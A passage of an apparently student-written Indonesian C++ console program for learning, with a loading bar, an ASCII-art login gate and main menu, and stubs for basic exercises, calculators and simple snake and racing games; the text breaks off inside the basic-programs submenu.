#include <iostream>
#include <stdio.h>
#include <conio.h>
#include <string>
#include <dos.h>
#include <windows.h>
#include <unistd.h>
#include <winable.h>
#include <ctime>
#include <time.h>
#include <stdlib.h>
#define batas_atas 2
#define batas_bawah 23
#define batas_samping 2
#define batas_samping_k 78
#define KOTAK char(178)
#define BATAS_KIRI 16
#define BATAS_KANAN 59
#define BATANG char(219)

using namespace std;

void print(int b, char a);

const char rocket[] =
"           _\n\
         /^\\\n\
         |-|\n\
         | |\n\
         |L|\n\
         |A|\n\
         |P|\n\
         |A|\n\
         |N|\n\
        /| |\\\n\
       / | | \\\n\
      |  | |  |\n\
       `-\"\"\"-`\n\
";
int iX(5),iY(5),x1(4),y1(4),xHapus(3),yHapus(3),veloX(1),veloY(0),ekorsX[200],ekorsY[200],nEkor=5,start=0,makX,makY;
int fullscreen();int loading();int welcome();int login();
int main_program();
	int ceremony();
	int program_dasar();
		int matriks_array();
		int deret_bilangan_1_sampai_5_berulang();
		int deret_bilangan_baris_ke_10();
		int deret_bilangan_ganjil();
		int deret_bilangan_genap_20_sampai_100_yang_habis_dibagi_5();
		int deret_bilangan_prima_1_sampai_100();
		int deret_bilangan_tambah_2();
		int deret_bintang_1();
		int deret_bintang_2();
	int program_aplikasi();
		int billing_warung_telekomunikasi();
		int billing_warung_telekomunikasi_2();
		int daftar_nilai_mahasiswa();
		int hitung_cashback_inap_hotel();
		int hitung_denda_bayar_listrik();
		int hitung_gaji_karyawan();
		int hitung_konsumsi_rata_rata_sepeda();
		int hitung_lama_pengerjaan_proyek();
		int hitung_luas_lingkaran();
		int hitung_luas_segitiga();
		int hitung_nilai_akhir_mahasiswa();
		int hitung_nilai_rata_rata_item();
		int hitung_perimeter_dan_luas_persegi_panjang();
		int hitung_total_biaya_dari_perhitungan_jarak_dan_bensin();
		int hitung_volume_balok();
		int kalkulator_sederhana();
		int konversi_angka_ribuan_menjadi_4_pecahan_bilangan();
		int konversi_hari_ke_tahun_minggu_dan_hari();
		int konversi_menit_ke_hitungan_jam_dan_menit();
		int konversi_suhu();
		int mencari_bilangan_terbesar_dari_2_bilangan();
		int mencari_bilangan_terbesar_dari_3_bilangan();
		int menentukan_bilangan_ganjil_atau_genap();
		int menentukan_bilangan_positif_atau_negatif();
		int menentukan_kategori_tinggi_badan(); 
		int menentukan_kesamaan_atau_perbedaan_2_bilangan_bulat();
		int pembagian_dengan_pengurangan_berulang();
		int penempatan_string_menggunakan_perintah_puts_dan_gotoxy();
		int perkalian_2_buah_bilangan_dengan_menggunakan_konsep_penjumlahan();
		int program_combine_3_kasus();
	int chivset();
		int syntax_konfigurasi_https_dan_ftps_debian_7_8();
	int game();
        int snake_game();
            void gotoxy(int x,int y);void naik();void turun();void samping();void samping_k();void hapus();
            void ekor();void tampil();void ganti_posisi();void velo();
            /*void trace(){for(int j = 0; j <= nEkor -1; j++){cout << "x" << j << " y"<< j<< " = " << ekorsX[j] << "," << ekorsY[j];cout << " // " << iX << "," << iY << endl;}system("pause");system("cls");}*/
            bool isDestroy();char getkey();void random_makanan();bool isEaten();void cBorder();void skor();void tulis_skor();void inisialisasi();
        int race_game();
            void gotoxy(int x, int y);void Credit();void gambarLatar();void gambarJalan(int spasi,int awal);
            int abs(int a);void batangDarah(int a);void jarak(int iJarak);void Speed(int speed);
            class car{
              public:
                int x,y,darah,kebal;bool exis;string gambar[5];
                car(){x=25;y=20;exis=false;darah=100;kebal=0;gambar[0]=" - ";gambar[1]="0+1";gambar[2]=" + ";gambar[3]="0+1";}
                void setPos(int a, int b){x=a;y=b;}
                void keKiri(){if(x>20){hapus();x-=1;}}
                void keKanan(){if(x+2<56){hapus();x+=1;}}
                void keBawah(){if(y+3<=23){hapus();y+=1;}}
                void keAtas(){if(y+3>3){hapus();y-=1;}}
                void hapus(){gotoxy(x+1,y);cout << " ";gotoxy(x,y+1);cout << "   ";gotoxy(x+1,y+2);cout << " ";gotoxy(x,y+3);cout << "   ";}
                bool cekTabrakan(car a){if((a.y>=y&&a.y<=y+3)&&(abs(a.x-x)<3)){return true;}else{return false;}}
                void gores(){for(int i=y;i<=(y+3);i++){gotoxy(x,i);for(int j=0;j<gambar[i-y].length();j++){if(gambar[i-y][j]=='0')cout<<char(221);else if(gambar[i-y][j]=='1')cout<<char(222);else if(gambar[i-y][j]=='+')cout<<BATANG;else if(gambar[i-y][j]=='-')cout<<char(220);else cout << " ";}}}
                void buatGambar(){if(kebal==0){gores();}else{if(kebal%2==0){gores();}else{hapus();}}}
            };
            void tulisTengah(string s, int y);void tidur(int a);void opening();
	int whitefox();
	int credits();
int fullscreen(){keybd_event(VK_MENU,0x38,0,0);keybd_event(VK_RETURN,0x1c,0,0);keybd_event(VK_RETURN,0x1c,KEYEVENTF_KEYUP,0);keybd_event(VK_MENU,0x38,KEYEVENTF_KEYUP,0);}
int loading()
{	
	/*
    system("cls");
	for(int i=1;i<=50;i++)
	{
		system("cls");
		cout<<"\n\n\n\n\t\t\t\t   Loading "<<'\n'<<'\t'<<'\t';cout<<endl;
		for(int j=1;j<=i;j++)
		cout<<"\xB2";cout<<"\n\n\t "<<2*i<<"%";
		if( i > 1 && i < 20)cout<<"\n\n\tCreating Temporary files";
		else if( i > 20 && i<40)cout<<"\n\n\tAccessing Main Memory";
		else if(i >40 && i<48)cout<<"\n\n\tAccessing Cache";
		else cout<<"\n\n\tComplete. Press Enter to Continue ";
	}
	*/
	
	system("cls");char a=178;int z;float l=1.5;
	for (int i=0;i<75;++i)
	{
		system("cls");z = 1 + rand() % (30 + 1 - 1) + 30;
		cout << "\n\n\n\n\n\n\n\n\t\t\t\tLoading " << (int)l << " %\n\n";
		cout << (char)201;print(76, 205);cout << (char)187 << endl << (char)186 << ' ';
		print(i, a);print(75 - i, ' ');cout << (char)186 << endl;
		//second line
		cout << (char)186 << ' ';print(i, a);print(75 - i, ' ');cout << (char)186 << endl;
		//third line
		cout << (char)186 << ' ';print(i, a);print(75 - i, ' ');cout << (char)186 << endl;
		//forth line
		cout << (char)186 << ' ';print(i, a);print(75 - i, ' ');cout << (char)186 << endl;
		//forth line
		cout << (char)200;print(76, 205);cout << (char)188;cout << "\n\n\t\tTip : After loading press any key to continue.";l = l + 1.33333333;Sleep(z);
	}
	/* _getch();return 0; */
	getche();welcome();
}
void print(int b, char a = ' '){for (int uuu = 0; uuu<b; ++uuu)cout << a;}
int welcome(){for(int i=0;i<50;i++)cout<<endl;cout << rocket;int j=300000;for(int i=0;i<50;i++){usleep(j);j=(int)(j*0.9);cout<<endl;}cout << "Visit http://ifannuddin.com ! " <<endl;cout<<endl;cout<<endl;cout << "Tekan [Enter] untuk melanjutkan : ";getche();login();return 0;}
int login()
{
    login:system("cls");string username;string password ="";char ch;
    cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
    cout << "Selamat Datang Di ALPHA " << endl;
    cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
    cout << endl;
    cout << "Username : ";cin>>username;
    cout << "Password : ";ch=_getch();while(ch!=13){password.push_back(ch);cout<< '*';ch=_getch();}
    cout << endl;
    cout << endl;
    if(username == "root" && password == "772007")
    {
        cout << "------------------------" << endl;
        cout << "    SUCCESS LOGIN       " << endl;
        cout << "------------------------" << endl;
        cout << endl;
        cout << endl;
        cout << "Tekan [Enter] untuk melanjutkan : ";getche();system("cls");main_program();return 0;
    }
    else
    {
        cout << "------------------------" << endl;
        cout << "    INVALID INPUT !     " << endl;
        cout << "------------------------" << endl;
        cout << endl;
        cout << endl;
        cout << "Tekan [Enter] untuk kembali mencoba : ";getche();system("cls");goto login;return 0;
    }
}
int main_program()
{
	main_program:system("cls");int pilihan;cout<<endl;cout<<endl;
    cout << "             ____________________________________________________                             ____________________________________________________" << endl;
    cout << "            /                                                    \\                           /                                                    \\" << endl;
    cout << "           |    _____________________________________________     |                         |    _____________________________________________     |" << endl;
    cout << "           |   |                                             |    |                         |   |                                             |    |" << endl;
    cout << "           |   |                                             |    |                         |   |                                             |    |" << endl;
    cout << "           |   |                   ALPHA                     |    |                         |   |                LIST PROGRAM                 |    |" << endl;
    cout << "           |   |                                             |    |                         |   |                                             |    |" << endl;
    cout << "           |   |                CREATED BY :                 |    |                         |   |   1. Ceremony         | 6. Chivset          |    |" << endl;
    cout << "           |   |                                             |    |                         |   |   2. Program Dasar    | 7. Game             |    |" << endl;
    cout << "           |   |         ILMAN MOCHAMAD ANDRIANSYAH          |    |                         |   |   3. Program Aplikasi | 8. Whitefox         |    |" << endl;
    cout << "           |   |                                             |    |                         |   |   4.                  | 9. Credits          |    |" << endl;
    cout << "           |   |             DYNAMIC DEVELOPER               |    |                         |   |   5.                  | 10. Exit            |    |" << endl;
    cout << "           |   |                                             |    |                         |   |                                             |    |" << endl;
    cout << "           |   |                C++ LEARNING                 |    |                         |   |                                             |    |" << endl;
    cout << "           |   |                                             |    |                         |   |                                             |    |" << endl;
    cout << "           |   |                                             |    |                         |   |                                             |    |" << endl;
    cout << "           |   |_____________________________________________|    |                         |   |_____________________________________________|    |" << endl;
    cout << "           |                                                      |                         |                                                      |" << endl;
    cout << "            \\_____________________________________________________/                          \\_____________________________________________________/" << endl;
    cout << "                   \\_______________________________________/                                       \\_______________________________________/" << endl;
    cout << "                _______________________________________________                                  _______________________________________________" << endl;
    cout << "             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_                            _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_" << endl;
    cout << "          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_                      _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_" << endl;
    cout << "       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_                _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_" << endl;
    cout << "    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_          _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_" << endl;
    cout << " _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_    _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_" << endl;
    cout << ":-----------------------------------------------------------------------------:  :-----------------------------------------------------------------------------:" << endl;
    cout << "`---._.-----------------------------------------------------------------._.---'  `---._.-----------------------------------------------------------------._.---'" << endl;
    cout << endl;cout << endl;cout << endl;
    cout << "Masukkan Pilihan : ";cin>>pilihan;
	if(pilihan==1){system("cls");ceremony();cout<<endl;cout<<endl;cout<<"Tekan [Enter] untuk kembali ke Home : ";getche();goto main_program;} 
	else if(pilihan==2){system("cls");program_dasar();cout<<endl;cout<<endl;cout<<"Tekan [Enter] untuk kembali ke Home : ";getche();goto main_program;}
	else if(pilihan==3){system("cls");program_aplikasi();cout<<endl;cout<<endl;cout<<"Tekan [Enter] untuk kembali ke Home : ";getche();goto main_program;}
	else if(pilihan==6){system("cls");chivset();cout<<endl;cout<<endl;cout<<"Tekan [Enter] untuk kembali ke Home : ";getche();goto main_program;}
	else if(pilihan==7){system("cls");game();cout<<endl;cout<<endl;cout<<"Tekan [Enter] untuk kembali ke Home : ";getche();goto main_program;}
	else if(pilihan==8){system("cls");whitefox();cout<<endl;cout<<endl;cout<<"Tekan [Enter] untuk kembali ke Home : ";getche();goto main_program;}
	else if(pilihan==9){system("cls");credits();cout<<endl;cout<<endl;cout<<"Tekan [Enter] untuk kembali ke Home : ";getche();goto main_program;}
	else if(pilihan==10){system("exit");}
	else
	{
        system("cls");
        cout << "              ,---------------------------,                           ,---------------------------,                           ,---------------------------, " << endl;
        cout << "              |  /---------------------\\  |                           |  /---------------------\\  |                           |  /---------------------\\  |" << endl;
        cout << "              | |                       | |                           | |                       | |                           | |                       | |" << endl;
        cout << "              | |     INVALID INPUT !   | |                           | |     INVALID INPUT !   | |                           | |     INVALID INPUT !   | |" << endl;
        cout << "              | |    NOT FOUND PROGRAM  | |                           | |    NOT FOUND PROGRAM  | |                           | |    NOT FOUND PROGRAM  | |" << endl;
        cout << "              | |        *******        | |                           | |        *******        | |                           | |        *******        | |" << endl;
        cout << "              | |                       | |                           | |                       | |                           | |                       | |" << endl;
        cout << "              |  \\_____________________/  |                           |  \\_____________________/  |                           |  \\_____________________/  |" << endl;
        cout << "              |___________________________|                           |___________________________|                           |___________________________|" << endl;
        cout << "            ,---\\_____     []     _______/------,                   ,---\\_____     []     _______/------,                   ,---\\_____     []     _______/------," << endl;
        cout << "          /         /______________\\           /|                 /         /______________\\           /|                 /         /______________\\           /|" << endl;
        cout << "        /___________________________________ /  | ___           /___________________________________ /  | ___           /___________________________________ /  | ___" << endl;
        cout << "        |                                   |   |    )          |                                   |   |    )          |                                   |   |    )" << endl;
        cout << "        |  _ _ _                 [-------]  |   |   (           |  _ _ _                 [-------]  |   |   (           |  _ _ _                 [-------]  |   |   (" << endl;
        cout << "        |  o o o                 [-------]  |  /    _)_         |  o o o                 [-------]  |  /    _)_         |  o o o                 [-------]  |  /    _)_" << endl;
        cout << "        |__________________________________ |/     /  /         |__________________________________ |/     /  /         |__________________________________ |/     /  /" << endl;
        cout << "    /-------------------------------------/|      ( )/      /-------------------------------------/|      ( )/      /-------------------------------------/|      ( )/" << endl;
        cout << "  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /               /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /               /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /" << endl;
        cout << "/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /               /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /               /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /" << endl;
        cout << "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" << endl;
        cout << endl;cout << endl;
		cout << "              ,---------------------------,                           ,---------------------------,                           ,---------------------------, " << endl;
        cout << "              |  /---------------------\\  |                           |  /---------------------\\  |                           |  /---------------------\\  |" << endl;
        cout << "              | |                       | |                           | |                       | |                           | |                       | |" << endl;
        cout << "              | |     INVALID INPUT !   | |                           | |     INVALID INPUT !   | |                           | |     INVALID INPUT !   | |" << endl;
        cout << "              | |    NOT FOUND PROGRAM  | |                           | |    NOT FOUND PROGRAM  | |                           | |    NOT FOUND PROGRAM  | |" << endl;
        cout << "              | |        *******        | |                           | |        *******        | |                           | |        *******        | |" << endl;
        cout << "              | |                       | |                           | |                       | |                           | |                       | |" << endl;
        cout << "              |  \\_____________________/  |                           |  \\_____________________/  |                           |  \\_____________________/  |" << endl;
        cout << "              |___________________________|                           |___________________________|                           |___________________________|" << endl;
        cout << "            ,---\\_____     []     _______/------,                   ,---\\_____     []     _______/------,                   ,---\\_____     []     _______/------," << endl;
        cout << "          /         /______________\\           /|                 /         /______________\\           /|                 /         /______________\\           /|" << endl;
        cout << "        /___________________________________ /  | ___           /___________________________________ /  | ___           /___________________________________ /  | ___" << endl;
        cout << "        |                                   |   |    )          |                                   |   |    )          |                                   |   |    )" << endl;
        cout << "        |  _ _ _                 [-------]  |   |   (           |  _ _ _                 [-------]  |   |   (           |  _ _ _                 [-------]  |   |   (" << endl;
        cout << "        |  o o o                 [-------]  |  /    _)_         |  o o o                 [-------]  |  /    _)_         |  o o o                 [-------]  |  /    _)_" << endl;
        cout << "        |__________________________________ |/     /  /         |__________________________________ |/     /  /         |__________________________________ |/     /  /" << endl;
        cout << "    /-------------------------------------/|      ( )/      /-------------------------------------/|      ( )/      /-------------------------------------/|      ( )/" << endl;
        cout << "  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /               /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /               /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /" << endl;
        cout << "/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /               /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /               /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /" << endl;
        cout << "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" << endl;
        cout << endl;cout << endl;
		cout << "Tekan [Enter] untuk kembali ke Home : ";getche();
		goto main_program;
	}
}
int ceremony()
{
	cout << endl;
}
int program_dasar()
{
    program_dasar:system("cls");string pilihan;
	cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
	cout << "Home >> Program Dasar" << endl;
	cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
    cout << endl;
    cout << "Welcome to My Program" << endl;
	cout << "Choose the program" << endl;
	cout << "1.Matriks Array" << endl;
	cout << "2.Deret Bilangan 1-5 Berulang" << endl;
	cout << "3.Deret Bilangan Baris ke 10" << endl;
	cout << "4.Deret Bilangan Ganjil" << endl;
	cout << "5.Deret Bilangan Genap 20-100 yang Habis Dibagi 5" << endl;
	cout << "6.Deret Bilangan Prima 1-100" << endl;
	cout << "7.Deret Bilangan Tambah 2" << endl;
	cout << "8.Deret Bintang 1" << endl;
	cout << "9.Deret Bintang 2" << endl;
	cout << endl;
	cout << "Masukkan Pilihan [MAPI] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "MAPI")
    {
        int pilihan;cout << endl;choosing_in_mapi:
        cout << "Masukkan Pilihan : ";cin>>pilihan;
        if(pilihan == 1)
        {
            system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Dasar >> Matriks Array" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;matriks_array();cout << endl;cout << endl;
        }
        else if(pilihan == 2)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Dasar >> Deret Bilangan 1-5 Berulang" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;deret_bilangan_1_sampai_5_berulang();cout << endl;cout << endl;
        }
		else if(pilihan == 3)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Dasar >> Deret Bilangan Baris ke 10" << endl;
